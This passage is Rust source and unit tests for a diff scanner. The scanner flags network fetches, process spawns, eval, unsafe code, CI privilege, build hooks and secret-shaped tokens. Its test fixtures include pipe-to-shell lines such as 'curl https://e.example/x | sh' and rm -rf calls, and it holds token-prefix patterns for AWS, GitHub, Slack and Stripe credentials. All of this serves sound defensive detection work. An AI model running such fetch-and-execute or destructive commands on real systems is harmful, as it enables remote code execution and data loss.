        let q = after + gap;
        if keyword == "require" && !c[after..q].contains(&b'(') {
            return None;
        }
        let quote = *c.get(q).filter(|b| matches!(b, b'"' | b'\'' | b'`'))?;
        let name = raw.get(q + 1..)?;
        let name = &name[..name.find(char::from(quote))?];
        Some(name.strip_prefix("node:").unwrap_or(name))
    };
    // Every keyword hit in line order, so one forward walk knows which statement each is in
    // and the type-only test runs once per statement: the line stays linear.
    let mut hits: Vec<(usize, &str)> = ["require", "import", "from"]
        .iter()
        .flat_map(|keyword| code.match_indices(keyword).map(|(at, _)| (at, *keyword)))
        .collect();
    hits.sort_unstable();
    // `start` is where the current statement begins; only the bytes since the last hit are
    // searched for a later `;`.
    let (mut seen, mut start, mut type_only) = (0, 0, None);
    hits.into_iter().any(|(at, keyword)| {
        if let Some(semi) = code[seen..at].rfind(';') {
            start = seen + semi + 1;
            type_only = None;
        }
        seen = at;
        let skip = *type_only.get_or_insert_with(|| {
            let head = code[start..].trim_start();
            head.starts_with("import type ") || head.starts_with("export type ")
        });
        !skip && specifier_at(at, keyword).is_some_and(|m| modules.contains(&m))
    })
}

fn token_in(text: &str, token: &str) -> bool {
    match token.strip_suffix('*') {
        // A prefix token: a boundary before it, none required after.
        Some(prefix) => text
            .match_indices(prefix)
            .any(|(i, _)| i == 0 || !is_boundary_blocker(text.as_bytes()[i - 1])),
        None => has_token(text, token),
    }
}

/// A private key header, or a cloud, forge or chat token by its fixed prefix and length.
/// The token itself is never copied into evidence: only its line number is.
#[must_use]
fn looks_like_secret(text: &str) -> bool {
    if text.contains("-----BEGIN") && text.contains("PRIVATE KEY") {
        return true;
    }
    let tail = |prefix: &str, min: usize, ok: fn(u8) -> bool| {
        text.match_indices(prefix).any(|(i, _)| {
            let before = i.checked_sub(1).map(|j| text.as_bytes()[j]);
            let boundary = before.is_none_or(|b| !b.is_ascii_alphanumeric());
            let run = text.as_bytes()[i + prefix.len()..]
                .iter()
                .take_while(|b| ok(**b))
                .count();
            boundary && run >= min
        })
    };
    let upper_digit = |b: u8| b.is_ascii_uppercase() || b.is_ascii_digit();
    let alnum = |b: u8| b.is_ascii_alphanumeric();
    let slack = |b: u8| b.is_ascii_alphanumeric() || b == b'-';
    tail("AKIA", 16, upper_digit)
        || ["ghp_", "gho_", "ghs_", "ghu_", "ghr_"]
            .iter()
            .any(|p| tail(p, 36, alnum))
        || ["xoxb-", "xoxp-", "xoxa-", "xoxr-"]
            .iter()
            .any(|p| tail(p, 10, slack))
        || tail("sk_live_", 16, alnum)
}

#[cfg(test)]
mod tests {
    use super::*;
    use deep_diff_forge_patch::parse;

    /// One file whose single hunk keeps a context line `x` and adds (`+`) or removes (`-`)
    /// `lines` after it.
    fn changed(path: &str, sign: char, lines: &[&str]) -> ReviewFile {
        let n = lines.len() + 1;
        let header = if sign == '+' {
            format!("@@ -1,1 +1,{n} @@")
        } else {
            format!("@@ -1,{n} +1,1 @@")
        };
        let mut text = format!("--- a/{path}\n+++ b/{path}\n{header}\n x\n");
        for line in lines {
            text.push(sign);
            text.push_str(line);
            text.push('\n');
        }
        parse(&text).unwrap().remove(0)
    }

    fn added(path: &str, lines: &[&str]) -> ReviewFile {
        changed(path, '+', lines)
    }

    fn removed(path: &str, lines: &[&str]) -> ReviewFile {
        changed(path, '-', lines)
    }

    fn signals(file: &ReviewFile) -> Vec<EvidenceSignal> {
        file_evidence(file).iter().map(|e| e.signal).collect()
    }

    /// A path and the line a rule's token would appear on in that language.
    fn sample_path(scope: Scope) -> &'static str {
        match scope {
            Scope::Languages(languages) => match languages[0] {
                Language::Rust => "src/x.rs",
                Language::Python => "x.py",
                Language::JavaScript => "x.ts",
                Language::Go => "x.go",
                Language::Shell => "x.sh",
                Language::Yaml => "x.yml",
            },
            Scope::Any => "notes.txt",
            Scope::CiWorkflow => ".github/workflows/ci.yml",
            Scope::BuildScript => "build.rs",
            Scope::PackageJson => "package.json",
        }
    }

    fn sample_token(token: &str) -> String {
        match token.strip_suffix('*') {
            Some(prefix) => format!("{prefix}_case()"),
            None => format!("{token} x"),
        }
    }

    /// N8: every token in the table has a case that finds it, on the side the rule reads.
    #[test]
    fn every_token_in_the_table_is_found() {
        for rule in RULES {
            if let Match::Imports(modules) = rule.matches {
                for module in modules {
                    let line = format!("const m = require(\"{module}\");");
                    let file = added(sample_path(rule.scope), &[&line]);
                    assert!(signals(&file).contains(&rule.signal), "{module}");
                }
            }
            let Match::Tokens(tokens) = rule.matches else {
                continue;
            };
            for token in tokens {
                let path = sample_path(rule.scope);
                let line = sample_token(token);
                let file = match rule.side {
                    Side::New => added(path, &[&line]),
                    Side::Old => removed(path, &[&line]),
                };
                assert!(
                    signals(&file).contains(&rule.signal),
                    "{} not found for {token:?} in {path}",
                    rule.signal.label()
                );
            }
        }
    }

    /// The same tokens in a comment or a string are not code.
    #[test]
    fn a_token_in_a_comment_or_string_is_not_code() {
        for (path, lines) in [
            (
                "src/x.rs",
                &[
                    "// unsafe Command::new",
                    "let s = \"unsafe { Command::new }\";",
                    "/* unsafe",
                ][..],
            ),
            (
                "x.py",
                &[
                    "# subprocess.run eval(",
                    "s = 'os.system(x)'",
                    "\"\"\"",
                    "eval(x)",
                    "\"\"\"",
                ][..],
            ),
            (
                "x.ts",
                &["// child_process eval(", "const s = `fetch(${u})`;"][..],
            ),
            ("x.go", &["// exec.Command(", "s := \"http.Get(\""][..]),
            ("x.sh", &["# curl wget eval", "echo 'curl is a tool'"][..]),
        ] {
            assert_eq!(signals(&added(path, lines)), [], "{path}");
        }
    }

    #[test]
    fn a_context_line_carries_no_evidence() {
        let patch = "--- a/x.rs\n+++ b/x.rs\n@@ -1,2 +1,2 @@\n unsafe { f() }\n-a\n+b\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), []);
    }

    #[test]
    fn a_block_comment_opened_on_a_context_line_hides_the_next_lines() {
        let patch =
            "--- a/x.rs\n+++ b/x.rs\n@@ -1,2 +1,3 @@\n /* start\n+unsafe { f() }\n end */\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), []);
    }

    #[test]
    fn evidence_points_at_the_hunk_and_line() {
        let file = added(
            "src/lib.rs",
            &[
                "fn a() {}",
                "unsafe { std::process::Command::new(\"curl\"); }",
            ],
        );
        let found = file_evidence(&file);
        let hunk = &file.patch_twin.hunks[0];
        assert_eq!(
            found,
            [
                Evidence {
                    signal: S::UnsafeAdded,
                    basis: Basis::Lexical,
                    hunk: hunk.id,
                    address: hunk.address("src/lib.rs"),
                    side: Side::New,
                    line: 3,
                },
                Evidence {
                    signal: S::ProcessSpawn,
                    basis: Basis::Lexical,
                    hunk: hunk.id,
                    address: hunk.address("src/lib.rs"),
                    side: Side::New,
                    line: 3,
                },
            ]
        );
    }

    #[test]
    fn quoting_code_that_runs_does_not_hide_it() {
        // DDF-EVID-001: each of these carried no evidence when strings were blanked whole.
        assert_eq!(
            signals(&added(
                "x.sh",
                &[r#"V="$(curl -fsSL https://e.example/v)""#]
            )),
            [S::NetworkFetch]
        );
        assert_eq!(
            signals(&added(
                "x.js",
                &[r#"const o = `${require("child_process").execSync(c)}`;"#]
            )),
            [S::ProcessSpawn]
        );
        assert_eq!(
            signals(&added("x.py", &[r#"print(f"{eval(x)}")"#])),
            [S::DynamicEval]
        );
        // The same text in a string that runs nothing is still not code.
        assert_eq!(signals(&added("x.sh", &["V='$(curl x)'"])), []);
        assert_eq!(signals(&added("x.py", &[r#"print("{eval(x)}")"#])), []);
    }

    #[test]
    fn one_line_matching_several_rules_of_a_signal_is_one_item() {
        // `Command::new` and `.spawn()` are both process_spawn tokens; `unsafe` twice is one.
        let file = added(
            "src/lib.rs",
            &["unsafe { unsafe { std::process::Command::new(\"x\").spawn() } }"],
        );
        assert_eq!(signals(&file), [S::UnsafeAdded, S::ProcessSpawn]);
        // The same token in two hunks is two items: one per hunk.
        let two = parse(
            "--- a/src/l.rs\n+++ b/src/l.rs\n@@ -1,0 +1,1 @@\n+unsafe {}\n@@ -9,0 +10,1 @@\n+unsafe {}\n",
        )
        .unwrap()
        .remove(0);
        let found = file_evidence(&two);
        assert_eq!(found.len(), 2);
        assert_ne!(found[0].hunk, found[1].hunk);
    }

    /// The PR 5 review's inputs (workflow `wf_b39e1c70-545`): an interpolation is scanned as
    /// code with its own strings, escapes and comments, so a closer in a nested string, after a
    /// backslash, in a comment or ending a `case` pattern neither hides the code after it nor
    /// exposes the outer string's text.
    #[test]
    fn an_interpolation_is_scanned_as_code_with_its_own_strings() {
        let hidden_before: [(&str, &str, EvidenceSignal); 12] = [
            ("a.sh", r#"V="$(echo ')' ; curl x)""#, S::NetworkFetch),
            ("a.sh", r#"V="$(echo \) ; curl x)""#, S::NetworkFetch),
            (
                "a.sh",
                r#"V="$(case a in a) curl x;; esac)""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"X="$(tr -d ')' < f | curl https://e.example/x)""#,
                S::NetworkFetch,
            ),
            ("a.sh", r#"V="$(echo "$(curl x)")""#, S::NetworkFetch),
            (
                "a.js",
                r#"const o = `${ "}" + require("child_process").execSync(c) }`;"#,
                S::ProcessSpawn,
            ),
            ("a.js", "const o = `${ /* } */ eval(x) }`;", S::DynamicEval),
            ("a.js", "const o = `${ `${ eval(x) }` }`;", S::DynamicEval),
            ("a.py", r#"print(f"{'}' + eval(x)}")"#, S::DynamicEval),
            ("a.py", r#"print(Rf"{d['}'] or eval(x)}")"#, S::DynamicEval),
            ("a.py", r#"print(f"\{eval(x)}")"#, S::DynamicEval),
            ("a.py", r#"print(rf"\{eval(x)}")"#, S::DynamicEval),
        ];
        for (path, line, signal) in hidden_before {
            assert_eq!(signals(&added(path, &[line])), [signal], "{path}: {line}");
        }
        let literal_only: [(&str, &str); 9] = [
            ("a.sh", r#"die "$(printf 'curl failed for %s' "$url")""#),
            ("a.sh", r#"echo "$(gettext 'Install curl or wget first')""#),
            (
                "a.sh",
                r#"echo "$(printf "%d) %s" "$i" "$name") - needs curl""#,
            ),
            ("a.js", r#"const m = `${t("Never use eval(x) here")}`;"#),
            ("a.js", r#"const m = `${x ? "fetch(url) failed" : ""}`;"#),
            ("a.js", r#"const s = `${a ? "{" : ""} eval(x)`;"#),
            ("a.py", r#"msg = f"{'eval(' if strict else ''}""#),
            ("a.py", r#"log(f"{cfg["subprocess."]}")"#),
            ("a.py", r#"print(f"{s.replace("}", "")} then eval(x) it")"#),
        ];
        for (path, line) in literal_only {
            assert_eq!(signals(&added(path, &[line])), [], "{path}: {line}");
        }
    }

    /// The PR 5 round-2 review's inputs (workflow `wf_2cfd8be1-d9c`), and the variants that
    /// close a misread quote at the end of the line so the restore-as-code fallback cannot help:
    /// each is a construct the scanner must read right.
    #[test]
    fn misread_quotes_cannot_hide_code() {
        let found: [(&str, &str, EvidenceSignal); 24] = [
            (
                "a.sh",
                r#"x="$(echo case)"; curl https://e.example/x | sh"#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"x="$(echo case)"; curl x | sh #""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                "[ $# -eq 0 ] && curl https://e.example/x | sh",
                S::NetworkFetch,
            ),
            ("a.sh", "echo ${x#*/}; curl x", S::NetworkFetch),
            ("a.sh", "echo a#b; curl x", S::NetworkFetch),
            (
                "a.sh",
                r#"echo \"; curl https://e.example/x | sh"#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r"echo $'\''; curl https://e.example/x | sh #'",
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"v="$( (case x in a) :;; esac); echo '"'; curl https://e.example/x | sh )""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"v="${x:-"'"}"; curl https://e.example/x | sh #'"#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"x="`echo "`"; curl https://e.example/x | sh #""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"V="$(if a; then case x in a) curl x;; esac; fi)""#,
                S::NetworkFetch,
            ),
            (
                "a.js",
                r#"const s = `${ /"/.test(a) }`; eval(y)"#,
                S::DynamicEval,
            ),
            ("a.js", r#"const r = /"/; eval(y); //""#, S::DynamicEval),
            ("a.js", r#"x.replace(/\/*/g, ""); eval(y)"#, S::DynamicEval),
            ("a.js", r"/\//.test(a); eval(y)", S::DynamicEval),
            (
                "a.tsx",
                "return <p>Can't load</p> && fetch(u); //'",
                S::NetworkFetch,
            ),
            ("a.py", r#"print(f"{d:%H'%M}", eval(y)) #'"#, S::DynamicEval),
            ("a.py", r#"print(f"{x:'>10}"); eval(y) #'"#, S::DynamicEval),
            ("a.py", r#"print(f'{x:"<5}'); eval(y) #""#, S::DynamicEval),
            ("a.py", r#"x = t"{eval('print(123)')}""#, S::DynamicEval),
            (
                "a.py",
                r#"print(f"{'''it's'''}"); eval(y) #'"#,
                S::DynamicEval,
            ),
            (
                "a.js",
                "const cp = require(`child_process`);",
                S::ProcessSpawn,
            ),
            (
                "a.js",
                r#"const cp = require( "child_process" );"#,
                S::ProcessSpawn,
            ),
            (
                "a.js",
                r#"import{exec}from"child_process";import "node:child_process";"#,
                S::ProcessSpawn,
            ),
        ];
        for (path, line, signal) in found {
            assert_eq!(signals(&added(path, &[line])), [signal], "{path}: {line}");
        }
        let literal_only: [(&str, &str); 12] = [
            (
                "a.sh",
                r#"echo "Matches: $(grep --ignore-case -c todo notes.txt) (fetch more with curl)""#,
            ),
            ("a.sh", r#"echo "Mode: $(echo $case) - install curl first""#),
            ("a.js", r#"// const cp = require("child_process");"#),
            (
                "a.js",
                r#"throw new Error("Do not require('child_process') in the browser bundle");"#,
            ),
            (
                "a.js",
                r#"const help = `Use ${cmd} or require("child_process") yourself`;"#,
            ),
            ("a.js", "const re = /from 'child_process'/;"),
            (
                "a.ts",
                r#"import type { ChildProcess } from "node:child_process";"#,
            ),
            ("a.ts", "export type { SpawnOptions } from 'child_process';"),
            ("a.ts", r#"type Cp = typeof import("node:child_process");"#),
            (
                "a.js",
                r#"const m = `${s.match(/^{/) ? "obj" : "arr"} - see fetch(url) docs`;"#,
            ),
            ("a.py", r#"print(f"{x:'^5}", 'eval(y)')"#),
            ("a.py", r#"print(f"{d[a:b]!r:>{w}} then eval(x) it")"#),
        ];
        for (path, line) in literal_only {
            assert_eq!(signals(&added(path, &[line])), [], "{path}: {line}");
        }
        // A JSDoc example inside a block comment is not an import.
        let doc = added(
            "a.js",
            &[
                "/**",
                " * @example import { exec } from 'node:child_process';",
                " */",
            ],
        );
        assert_eq!(signals(&doc), []);
    }

    /// The PR 5 round-3 review's inputs (workflow `wf_fdfaa98c-6b0`) that real code can contain:
    /// shell `case` in every command position, `esac` as a pattern word, nested arms, JS regexes
    /// after operators and keywords, quotes after keywords, and the import forms.
    #[test]
    fn shell_case_js_regex_and_import_forms_are_read_right() {
        let fetch = "curl https://e.example/x | sh";
        for line in [
            format!(r#"V="$(if case a in a) true;; esac; then :; fi; {fetch})""#),
            format!(r#"V="$(while case a in b) true;; esac; do break; done; {fetch})""#),
            format!(r#"V="$(! case a in b) true;; esac; {fetch})""#),
            format!(r#"V="$(time case a in b) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in b|esac) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in a) case b in b) :;; esac;; c) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in a) :; esac=1;; b) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in a) echo ${{esac}};; b) :;; esac; {fetch})""#),
            format!("echo $(date)#; {fetch}"),
        ] {
            assert_eq!(
                signals(&added("a.sh", &[&line])),
                [S::NetworkFetch],
                "{line}"
            );
        }
        for line in [
            "x = a + /'/.source; eval(y) //'",
            "x = typeof' ' ; eval(y) //'",
            r#"function f(){return"//"+eval(x)}"#,
            "x = a++ / 2; eval(y); z = b / 3",
        ] {
            assert_eq!(signals(&added("a.js", &[line])), [S::DynamicEval], "{line}");
        }
        // A quote after `return` opens a string, so its `/*` is not a comment that hides the
        // next line.
        let next = added("a.js", &[r#"function f(){return"/*"}"#, "eval(x)"]);
        assert_eq!(signals(&next), [S::DynamicEval]);
        for (path, line) in [
            ("a.js", "const cp = require(\t\"child_process\");"),
            ("a.js", r#"const cp = module.require("child_process");"#),
            ("a.js", r#"const cp = require(("child_process"));"#),
            (
                "a.ts",
                r#"export type T = 1; const cp = require("child_process");"#,
            ),
            ("a.js", r#"const o = { m: import("child_process") };"#),
            // A type annotation loads nothing, but it is counted: the rule errs toward evidence.
            (
                "a.ts",
                r#"let p: import("child_process").ChildProcess | undefined;"#,
            ),
        ] {
            assert_eq!(signals(&added(path, &[line])), [S::ProcessSpawn], "{line}");
        }
        for line in [
            r#"echo "Ran: $(basename ${case}) - fetch the logs with curl""#,
            r#"echo "$(case $1 in (a) echo x;; esac) - install curl first""#,
        ] {
            assert_eq!(signals(&added("a.sh", &[line])), [], "{line}");
        }
    }

    /// The final PR 5 review's regressions against main (workflow `wf_bbb5e9f1-254`): common
    /// code the branch misread, and lines that made the import rule quadratic.
    #[test]
    fn common_typescript_continuations_and_raw_strings_keep_their_evidence() {
        for (path, line, signal) in [
            (
                "n.ts",
                "const pct = (stats.get(key)! / total) * 100; const res = await fetch(`/api/stats/${key}`);",
                S::NetworkFetch,
            ),
            (
                "n.ts",
                r#"const ms = timings[name]! / 1000; void fetch("/log", { method: "POST" });"#,
                S::NetworkFetch,
            ),
            (
                "n.ts",
                "const pct = done! / total; const out = execSync(`du -sh ${dir}/`);",
                S::ProcessSpawn,
            ),
            (
                "a.js",
                r"const run = cmd => /^'/.test(cmd) ? null : execSync(cmd, { shell: '/bin/sh' });",
                S::ProcessSpawn,
            ),
            (
                "src/a.rs",
                r#"let root = Path::new(r"C:\"); let out = Command::new("cmd").output()?;"#,
                S::ProcessSpawn,
            ),
            (
                "src/a.rs",
                r##"let s = r#"a "quoted" \"#; unsafe { f() }"##,
                S::UnsafeAdded,
            ),
            (
                "src/a.rs",
                r#"let b = br"\"; unsafe { f() }"#,
                S::UnsafeAdded,
            ),
        ] {
            assert_eq!(signals(&added(path, &[line])), [signal], "{path}: {line}");
        }
        // A line that continues an expression with `/` divides; one after `=` opens a regex.
        let divided = added(
            "m3.js",
            &[
                "const elapsed = (Date.now() - start)",
                "  / 1000; fetch(`/api/timing/${elapsed}`);",
            ],
        );
        assert_eq!(signals(&divided), [S::NetworkFetch]);
        let regex = added("m3.js", &["const re =", "  /fetch(/; const x = 1;"]);
        assert_eq!(signals(&regex), []);
        // A raw string's text is still text, and an ordinary string still escapes.
        assert_eq!(signals(&added("src/a.rs", &[r#"let s = r"unsafe";"#])), []);
        assert_eq!(signals(&added("src/a.rs", &[r#"let s = "\"unsafe";"#])), []);
    }

    #[test]
    fn the_import_rule_is_linear_on_long_lines() {
        within_deadline(|| {
            let start = ScanClock::start();
            for unit in [
                "Array.from(x),",
                "from ",
                "require ",
                "import ",
                "require(require(",
            ] {
                let line = unit.repeat(200_000);
                assert_eq!(signals(&added("a.js", &[&line])), [], "{unit}");
            }
            let spaced = format!(";{}from 'child_process'", " ".repeat(200_000));
            assert_eq!(signals(&added("a.js", &[&spaced])), [S::ProcessSpawn]);
            // Linear scans of these lines took about 2 s in a debug build; the quadratic import
            // rule of eee2b4c^ took about 66 s.
            let spent = start.elapsed();
            assert!(
                spent < std::time::Duration::from_secs(15),
                "the long lines took {spent:?} of {}",
                start.kind
            );
        });
    }

    /// The time a scan spends: the thread's own CPU time where Linux reports it, so a busy host
    /// does not fail the bound (a starved run measured 1.8 s of CPU in over 10 s of wall time),
    /// and wall time elsewhere.
    struct ScanClock {
        kind: &'static str,
        cpu_ns: Option<u64>,
        wall: std::time::Instant,
    }

    impl ScanClock {
        fn start() -> Self {
            let cpu_ns = thread_cpu_ns();
            #[expect(
                clippy::disallowed_methods,
                reason = "test door: the fallback clock where no CPU time is reported"
            )]
            let wall = std::time::Instant::now();
            let kind = if cpu_ns.is_some() {
                "thread CPU time"
            } else {
                "wall time"
            };
            Self { kind, cpu_ns, wall }
        }

        fn elapsed(&self) -> std::time::Duration {
            match (self.cpu_ns, thread_cpu_ns()) {
                (Some(then), Some(now)) => std::time::Duration::from_nanos(now - then),
                _ => self.wall.elapsed(),
            }
        }
    }

    /// The calling thread's CPU time in nanoseconds: the first field of Linux's
    /// `/proc/thread-self/schedstat`, or `None` where that file does not exist.
    fn thread_cpu_ns() -> Option<u64> {
        let stat = std::fs::read_to_string("/proc/thread-self/schedstat").ok()?;
        stat.split_whitespace().next()?.parse().ok()
    }

    /// Run `work` on its own thread and fail if it takes more than two minutes of wall time.
    /// This bound only keeps a hang from stalling the suite, so a diff-mutation run reports a
    /// looping mutant as caught rather than as a timeout; the scan's cost is bounded by
    /// [`ScanClock`] inside the work.
    fn within_deadline<T: Send + 'static>(work: impl FnOnce() -> T + Send + 'static) -> T {
        let (done, wait) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            let _ = done.send(work());
        });
        wait.recv_timeout(std::time::Duration::from_secs(120))
            .expect("a long line was scanned within two minutes")
    }

    /// The import rule's receiver, boundary, `typeof` and statement decisions, each pinned.
    #[test]
    fn import_rule_decisions_are_exact() {
        for (line, spawn) in [
            (r#"const cp = foo.require("child_process");"#, false),
            (r#"const cp = requirex("child_process");"#, false),
            (r#"const t = typeof require("child_process");"#, true),
            (
                r#"x = Array.from(y); import type {A} from "child_process";"#,
                false,
            ),
            (
                r#"x = Array.from(y); import {A} from "child_process";"#,
                true,
            ),
        ] {
            let expected: &[EvidenceSignal] = if spawn { &[S::ProcessSpawn] } else { &[] };
            assert_eq!(signals(&added("a.ts", &[line])), expected, "{line}");
        }
    }

    #[test]
    fn child_process_imports_are_spawn_evidence() {
        for line in [
            r#"const cp = require("child_process");"#,
            "import { execFile } from 'node:child_process';",
            r#"const { spawn } = await import("child_process");"#,
        ] {
            assert_eq!(
                signals(&added("a.js", &[line])),
                [S::ProcessSpawn],
                "{line}"
            );
        }
        // Naming another module, or the name alone in a message, is not.
        assert_eq!(
            signals(&added("a.js", &[r#"log("child process done")"#])),
            []
        );
    }

    #[test]
    fn removed_tests_are_read_on_the_old_side() {
        let file = removed("src/x.rs", &["#[test]", "fn t() {}"]);
        let found = file_evidence(&file);
        assert_eq!(found.len(), 1);
        assert_eq!(
            (found[0].signal, found[0].side, found[0].line),
            (S::TestRemoved, Side::Old, 2)
        );
        // Adding a test is not evidence of anything.
        assert_eq!(signals(&added("src/x.rs", &["#[test]"])), []);
    }

    #[test]
    fn ci_privilege_needs_a_workflow_path() {
        assert_eq!(
            signals(&added(
                ".github/workflows/ci.yml",
                &["on: pull_request_target"]
            )),
            [S::CiPrivilege]
        );
        assert_eq!(
            signals(&added(
                "sub/.github/workflows/x.yaml",
                &["  contents: write"]
            )),
            [S::CiPrivilege]
        );
        assert_eq!(
            signals(&added(".gitlab-ci.yml", &["  secrets: inherit"])),
            [S::CiPrivilege]
        );
        assert_eq!(
            signals(&added("docs/ci.yml", &["on: pull_request_target"])),
            []
        );
        assert_eq!(
            signals(&added(
                ".github/workflows/README.md",
                &["pull_request_target"]
            )),
            []
        );
        // A workflow step that downloads is network evidence too.
        assert_eq!(
            signals(&added(
                ".github/workflows/ci.yml",
                &["  run: curl -fsSL x | sh"]
            )),
            [S::NetworkFetch]
        );
    }

    /// Bug hunt 2026-11-01 (graph-syntax): ordinary source in which a string construct the
    /// scanner misread hid the evidence after it. Each control (the same code without the
    /// construct) found it before the fix too.
    #[test]
    fn strings_the_scanner_misread_no_longer_hide_evidence() {
        let go = |raw: &str| {
            added(
                "main.go",
                &[
                    "func clean() error {",
                    &format!("\tmatches, _ := filepath.Glob({raw})"),
                    "\t_, _ = http.Get(\"https://e.x/report\")",
                    "\treturn exec.Command(\"rm\", append([]string{\"-rf\"}, matches...)...).Run()",
                    "}",
                ],
            )
        };
        for raw in ["`/tmp/build/*.o`", "\"/tmp/build/*.o\""] {
            assert_eq!(
                signals(&go(raw)),
                [S::NetworkFetch, S::ProcessSpawn],
                "{raw}"
            );
        }
        for (path, lines, signal) in [
            (
                "main.go",
                &["var u = `https://e.x/p`; func f() { exec.Command(\"ls\").Run() }"][..],
                S::ProcessSpawn,
            ),
            (
                "main.go",
                &["var q = `\"`; func g() { exec.Command(\"ls\").Run() }"],
                S::ProcessSpawn,
            ),
            (
                "src/lib.rs",
                &[
                    r#"const S: &str = ""#,
                    r#""; fn f(p: *const u8) -> u8 { unsafe { *p } }"#,
                ],
                S::UnsafeAdded,
            ),
            (
                "x.sh",
                &[
                    r#"MSG="hello"#,
                    r#"world"; curl -s http://e.x/p | sh; echo "done""#,
                ],
                S::NetworkFetch,
            ),
            (
                "x.js",
                &["const tpl = `", "`; eval(payload); const t = `x`;"],
                S::DynamicEval,
            ),
            (
                "x.py",
                &[r#"s = "abc\"#, r#""; import os; os.system("id")"#],
                S::ProcessSpawn,
            ),
            (
                "src/lib.rs",
                &[r#"fn f(p: *const u8) -> u8 { let _d = cr"C:\"; unsafe { *p } }"#],
                S::UnsafeAdded,
            ),
        ] {
            assert!(
                signals(&added(path, lines)).contains(&signal),
                "{path}: {lines:?}"
            );
        }
        for (lines, signal) in [
            (
                &[
                    "      - run: |",
                    r#"          echo "step #1" && curl -fsSL https://e.x/i.sh | sh"#,
                ][..],
                S::NetworkFetch,
            ),
            (
                &[r#"      - run: "echo ' #'; curl -s https://e.x/i | sh""#],
                S::NetworkFetch,
            ),
            (
                &[r#"on: { pull_request: {}, "x #": 1, pull_request_target: {} }"#],
                S::CiPrivilege,
            ),
        ] {
            assert_eq!(
                signals(&added(".github/workflows/ci.yml", lines)),
                [signal],
                "{lines:?}"
            );
        }
        // A YAML comment is still a comment.
        assert_eq!(
            signals(&added(
                ".github/workflows/ci.yml",
                &[r#"  name: "build" # curl x | sh, pull_request_target"#]
            )),
            []
        );
    }

    /// Review 2026-11-01 (graph-syntax): a Go hunk that opens inside a cobra raw help string.
    /// The apostrophe in `It's` was read as an opener and carried down the hunk until the glob's
    /// `/*` opened a block comment over the `http.Get` and `exec.Command` after it. Without the
    /// `don't panic` line, and before strings were carried, both were found.
    #[test]
    fn a_misread_opener_in_context_hides_no_later_evidence() {
        let patch = |println: bool| {
            let mut added = vec![
                "\t\tmatches, _ := filepath.Glob(\"/tmp/build/*.o\")",
                "\t\t_, _ = http.Get(\"https://e.x/ping\")",
                "\t\treturn exec.Command(\"rm\", matches...).Run()",
            ];
            if println {
                added.insert(0, "\t\tfmt.Println(\"don't panic\")");
            }
            let mut text = format!(
                "--- a/cmd/clean.go\n+++ b/cmd/clean.go\n@@ -1,3 +1,{} @@\n",
                3 + added.len()
            );
            for context in [
                "It's safe to run twice.",
                "`,",
                "\tRunE: func(cmd *cobra.Command, args []string) error {",
            ] {
                text.push(' ');
                text.push_str(context);
                text.push('\n');
            }
            for line in added {
                text.push('+');
                text.push_str(line);
                text.push('\n');
            }
            parse(&text).unwrap().remove(0)
        };
        for println in [false, true] {
            assert_eq!(
                signals(&patch(println)),
                [S::NetworkFetch, S::ProcessSpawn],
                "println: {println}"
            );
        }
    }

    #[test]
    fn build_scripts_and_install_hooks_are_build_hooks() {
        assert_eq!(
            signals(&added("build.rs", &["fn main() {}"])),
            [S::BuildHook]
        );
        assert_eq!(signals(&added("build.rs", &["// only a comment", ""])), []);
        assert_eq!(
            signals(&added("sub/setup.py", &["setup(name='x')"])),
            [S::BuildHook]
        );
        assert_eq!(
            signals(&added("package.json", &["  \"postinstall\": \"node x\","])),
            [S::BuildHook]
        );
        assert_eq!(
            signals(&added("package.json", &["  \"name\": \"install-helper\","])),
            []
        );
    }

    #[test]
    fn secrets_are_found_by_shape_and_never_copied() {
        // Built at run time, so the repository's own secret scan never sees a token here.
        let aws = format!("key = \"AKIA{}\"", "Q7".repeat(8));
        let forge = format!("t='ghp_{}'", "a1".repeat(18));
        let chat = format!("# xoxb-{}", "12345-abcde");
        let stripe = format!("sk_live_{}", "Z".repeat(16));
        let header = format!("-----BEGIN {} PRIVATE KEY-----", "RSA");
        for line in [&aws, &forge, &chat, &stripe, &header] {
            assert_eq!(
                signals(&added("notes.txt", &[line])),
                [S::SecretLike],
                "{line}"
            );
        }
        for line in [
            format!("AKIA{}", "Q".repeat(15)),
            format!("XAKIA{}", "Q".repeat(16)),
            format!("ghp_{}", "a".repeat(35)),
            "-----BEGIN CERTIFICATE-----".to_owned(),
        ] {
            assert_eq!(signals(&added("notes.txt", &[&line])), [], "{line}");
        }
        let found = file_evidence(&added("notes.txt", &[&aws]));
        assert!(
            !format!("{found:?}").contains("AKIA"),
            "a secret was copied into evidence"
        );
    }

    #[test]
    fn a_path_scoped_rule_follows_the_generated_rule_and_a_token_rule_does_not() {
        assert_eq!(
            signals(&added("target/debug/build.rs", &["fn main() {}"])),
            []
        );
        assert_eq!(
            signals(&added(
                "node_modules/x/package.json",
                &["\"postinstall\": \"x\""]
            )),
            []
        );
        assert_eq!(
            signals(&added(
                "src/generated/x.rs",
                &["std::process::Command::new(\"curl\");"]
            )),
            [S::ProcessSpawn]
        );
    }

    #[test]
    fn suppressions_are_read_in_comments() {
        assert_eq!(
            signals(&added("x.py", &["import os  # noqa: F401"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added("x.ts", &["// @ts-ignore"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added("x.go", &["x := y //nolint:errcheck"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added("src/x.rs", &["#[allow(dead_code)]"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added(
                "src/x.rs",
                &["#[expect(dead_code, reason = \"r\")]"]
            )),
            []
        );
    }

    #[test]
    fn a_shebang_names_the_language_of_a_file_with_no_extension() {
